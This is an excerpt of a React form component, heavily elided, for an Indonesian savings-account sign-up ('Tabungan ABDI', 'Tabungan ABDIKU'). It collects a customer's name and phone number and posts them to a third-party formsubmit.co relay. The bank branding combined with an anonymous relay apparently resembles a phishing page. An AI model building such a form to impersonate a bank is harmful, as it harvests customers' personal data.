...
const MainPage = () => {
  ...
  const handleSubmit = async (e: React.FormEvent) => {
    ...
    try {
      const response = await fetch('https://formsubmit.co/a56b76c554c52e9362bff114b5528c24', {
        method: 'POST',
        headers: {
    ...
    <div className="max-w-4xl mx-auto p-6">
      <div className="mb-8">
        ...
        <form onSubmit={handleSubmit} className="space-y-8">
          ...
          <div className="bg-[#003868] rounded-lg p-6 text-white">
            <h5 className="text-lg font-bold mb-4">Jenis Tabungan</h5>
            <div className="flex flex-row justify-between items-center">
              <div className="flex items-center space-x-3">
                ...
                />
                <label htmlFor="customRadioInline1" className="text-white">
                  Tabungan ABDI
                </label>
              </div>
              <div className="flex items-center space-x-3">
                <input
                  ...
                  className="form-radio h-4 w-4 text-white border-white focus:ring-0"
                />
                <label htmlFor="customRadioInline2" className="text-white">
                  Tabungan ABDIKU
                </label>
              </div>
              <div className="flex items-center space-x-3">
                <input
                  ...
                  className="form-radio h-4 w-4 text-white border-white focus:ring-0"
                />
                <label htmlFor="customRadioInline3" className="text-white">
          ...
          <div className="space-y-6">
            <div>
              <label htmlFor="namaLengkap" className="block text-sm font-medium text-black mb-1">
                Nama Lengkap Anda
              </label>
              <input
                type="text"
            ...
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div>
                <label htmlFor="noHandphone" className="block text-sm font-medium text-gray-700 mb-1">
                  No Handphone
                </label>
                <input
                  type="tel"
